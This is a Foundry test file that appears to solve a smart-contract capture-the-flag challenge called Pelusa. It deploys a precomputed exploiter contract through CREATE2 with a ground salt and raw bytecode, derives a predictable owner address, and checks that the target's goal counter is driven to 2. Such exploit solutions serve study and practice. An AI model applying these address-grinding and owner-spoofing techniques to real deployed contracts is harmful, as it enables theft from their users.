// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Pelusa.sol";
import "../src/Exploiter.sol";

contract PelusaTest is Test {
    Exploiter public exploiter;
    ExploiterDeployer public exploiterDeployer;
    Pelusa public pelusa;
    Game public game;
    address public owner;

    function setUp() public {
        address sender = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2; // arbitrary address
        vm.startPrank(sender);
        owner = address(uint160(uint256(keccak256(abi.encodePacked(sender, blockhash(block.number))))));
        pelusa = new Pelusa(); // This address will always be `0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95`. In an actual exploit scenario, the address would be known beforehand.
        exploiterDeployer = new ExploiterDeployer(); // This address will always be `0x652c9ACcC53e765e1d96e2455E618dAaB79bA595`
        game = new Game();
        game.updateOwner(owner);
        // Using the known initialization bytecode (Exploiter.json => `deployedBytecode`) from compiling 
        // the **Exploiter** contract and the known deployment address (`0x652c`) above, we can generate
        // a salt that will meet the criteria using the script in **legalHash.sh**.
        uint salt = 8416179358416012251592484907188523450015968986233305385527795217386452010955;
        address _exploiter = exploiterDeployer.deploySimple(hex'60a060405234801561001057600080fd5b5073a131ad247055fd2e2aa8b156a11bdec81b9ead95608081905260408051600481526024810182526020810180516001600160e01b031663a508833960e01b179052905161005f91906100a9565b6000604051808303816000865af19150503d806000811461009c576040519150601f19603f3d011682016040523d82523d6000602084013e6100a1565b606091505b5050506100d8565b6000825160005b818110156100ca57602081860181015185830152016100b0565b506000920191825250919050565b6080516101cc6100f0600039600050506101cc6000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80630d8032fe14610051578063478a4be51461006f578063db258f9c14610078578063e09235ad146100aa575b600080fd5b6002600155630150a3a25b6040519081526020015b60405180910390f35b61005c60015481565b6100a8610086366004610155565b600280546001600160a01b0319166001600160a01b0392909216919091179055565b005b6100b26100ca565b6040516001600160a01b039091168152602001610066565b6002546040805163e09235ad60e01b815290516000926001600160a01b03169163e09235ad9160048083019260209291908290030181865afa158015610114573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101389190610179565b905090565b6001600160a01b038116811461015257600080fd5b50565b60006020828403121561016757600080fd5b81356101728161013d565b9392505050565b60006020828403121561018b57600080fd5b81516101728161013d56fea26469706673582212208a3fa6b6b5f8bc8c93d05c39cc96dd090457a80651ea09b6282d4aa52821374f64736f6c63430008110033', salt);
        exploiter = Exploiter(_exploiter);
        exploiter.updateGameAddress(address(game));
        assertEq(address(pelusa), 0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95);
        assertEq(address(exploiterDeployer), 0x652c9ACcC53e765e1d96e2455E618dAaB79bA595);
        assertEq(_exploiter, 0x04f9CF7C31983C5dA7b83172Dd32518679da7146);
    }   

    function testShoot() public {
        pelusa.shoot();
        assertEq(pelusa.goals(), 2);
    }
}
